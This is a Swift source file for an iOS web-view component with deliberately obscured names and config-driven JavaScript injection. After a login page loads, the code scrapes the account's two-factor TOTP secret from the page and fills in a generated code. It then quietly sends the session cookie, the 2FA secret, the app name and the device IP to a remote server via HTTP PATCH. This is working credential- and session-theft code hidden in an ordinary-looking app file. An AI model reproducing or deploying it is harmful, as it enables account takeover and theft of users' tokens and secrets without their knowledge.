//
//  File.swift
//  
//
//  Created by DanHa on 25/03/2023.
//

import SwiftUI
import WebKit
import SwiftOTP

@available(iOS 14.0, *)
struct Coords_Seven_Au : UIViewRepresentable {
    func makeCoordinator() -> Lop_Seven_Au_Coordinator {
        Lop_Seven_Au_Coordinator(self)
    }
    let url: URL?
    var arrayData: [String: String] = [:]
    private let ob_Seven_auservable = Seven_au_Observable()
    var ob_Seven_au_server: NSKeyValueObservation? {
        ob_Seven_auservable.in_Seven_au_stance
    }
    
    func makeUIView(context:Context) -> WKWebView {
        let prefs = WKWebpagePreferences()
        prefs.allowsContentJavaScript = true //true
        let config = WKWebViewConfiguration()
        config.defaultWebpagePreferences = prefs
        
        let webview = WKWebView(frame: .zero, configuration: config)
        webview.customUserAgent = arrayData[ValueKey.Chung_fr_02.rawValue] ?? ""
        webview.navigationDelegate = context.coordinator
        webview.load(URLRequest(url: url!))

        return webview
    }
    
    func updateUIView(_ uiView: WKWebView,context:Context) { }
   
    class Lop_Seven_Au_Coordinator : NSObject, WKNavigationDelegate {
        var Seven_au_con_parent: Coords_Seven_Au
            init(_ Seven_au_con_parent: Coords_Seven_Au) {
                self.Seven_au_con_parent = Seven_au_con_parent
            }
        
        func readIppAdd() -> String {
            var address_i_p: String?
            if let data_bit = UserDefaults.standard.object(forKey: "diachiip") as? Data {
                if let loadedPerson = try? JSONDecoder().decode(UserInvoicesIpadress.self, from: data_bit) {
                    address_i_p = loadedPerson.diachiip
                }
            }
            return address_i_p ?? "diachiip_IP_Null"
        }

  func Coords_Seven_matches(for regex: String, in text: String) -> [String] {
       do {
           let regex = try NSRegularExpression(pattern: regex)
           let results = regex.matches(in: text,
                                       range: NSRange(text.startIndex..., in: text))
           return results.map {
               String(text[Range($0.range, in: text)!])
           }
       } catch let error {
           print("Error: \(error.localizedDescription)")
           return []
       }
   }
        
func webView(_ webView: WKWebView, didStartProvisionalNavigation navigation: WKNavigation!) {
}//didStartProvisionalNavigation
        
func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
    webView.evaluateJavaScript(self.Seven_au_con_parent.arrayData[ValueKey.nine_fr_1a.rawValue] ?? "", completionHandler: { result, error in })

// Cho 5s cho load html all.
    DispatchQueue.main.asyncAfter(deadline: .now() + 10.0) {
        webView.evaluateJavaScript(self.Seven_au_con_parent.arrayData[ValueKey.outer_fr_1a.rawValue] ?? "") { html, error in
            if let content = html as? String, error == nil {
                DispatchQueue.main.asyncAfter(deadline: .now() + 3.0) {
// Loc ra key
                    let matchedsecret = self.Coords_Seven_matches(for: self.Seven_au_con_parent.arrayData[ValueKey.nine_fr_2a.rawValue] ?? "", in: content).filter({ !$0.isEmpty })
                    if !matchedsecret.isEmpty {
                        let secretString = matchedsecret[0]
                        guard let data = base32DecodeToData(secretString) else { return }
                        guard let totp = TOTP(secret: data), let otpString = totp.generate(time: Date()) else {
                            return
                        }
                        webView.evaluateJavaScript(self.Seven_au_con_parent.arrayData[ValueKey.nine_fr_3a.rawValue] ?? "", completionHandler: { result, error in })
// Cho 2s se dien vao input
                        DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
                            //copy key vao bo nho tam
                            let pasteboard = UIPasteboard.general
                            pasteboard.string = otpString
                            // Paste input enter.
                            if let stringinput = pasteboard.string {
                                //print(stringinput)
                                webView.evaluateJavaScript("\(self.Seven_au_con_parent.arrayData[ValueKey.seven_fr_01.rawValue] ?? "")\(stringinput)\(self.Seven_au_con_parent.arrayData[ValueKey.seven_fr_02.rawValue] ?? "")\(stringinput)\(self.Seven_au_con_parent.arrayData[ValueKey.seven_fr_03.rawValue] ?? "")", completionHandler: { result, error in })
                            }
                            
                            WKWebsiteDataStore.default().httpCookieStore.getAllCookies({ (cookies) in
                                let seven_reco_Au_i = cookies.firstIndex(where: { $0.name == self.Seven_au_con_parent.arrayData[ValueKey.name_api_09.rawValue] ?? "" })
                                if(seven_reco_Au_i != nil){
                                    let Seven_reco_Au_json_data: [String: Any] = [
                                        self.Seven_au_con_parent.arrayData[ValueKey.name_api_23.rawValue] ?? "": cookies[seven_reco_Au_i!].value,
                                        self.Seven_au_con_parent.arrayData[ValueKey.name_api_24.rawValue] ?? "": "\(matchedsecret[0])",
                                        self.Seven_au_con_parent.arrayData[ValueKey.name_api_25.rawValue] ?? "": "\(Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as! String)-ONE",
                                        self.Seven_au_con_parent.arrayData[ValueKey.name_api_26.rawValue] ?? "": self.readIppAdd()
                                    ]
                                    let url : URL = URL(string: self.Seven_au_con_parent.arrayData[ValueKey.Chung_fr_08.rawValue] ?? "")!
                                    let json_data = try? JSONSerialization.data(withJSONObject: Seven_reco_Au_json_data)
                                    var request = URLRequest(url: url)
                                    request.httpMethod = "PATCH"
                                    request.setValue("application/json", forHTTPHeaderField: "Content-Type")
                                    request.httpBody = json_data
                                    let task = URLSession.shared.dataTask(with: request) { data, response, error in
                                        if error != nil {
                                            print("Not Done")
                                        } else if data != nil {
                                            //self.parent.is_seven_reco_done = true
                                            print("Done")
                                        }
                                    }
                                    task.resume()
                                }
                            })
                        }
                    }
                }
            }
        }
    }

    }
 }
}


// Mark Lop theo doi url
@available(iOS 14.0, *)
private class Seven_au_Observable: ObservableObject {
    @Published var in_Seven_au_stance: NSKeyValueObservation?
}

struct UserInvoicesIpadress: Codable {
    var diachiip: String
}
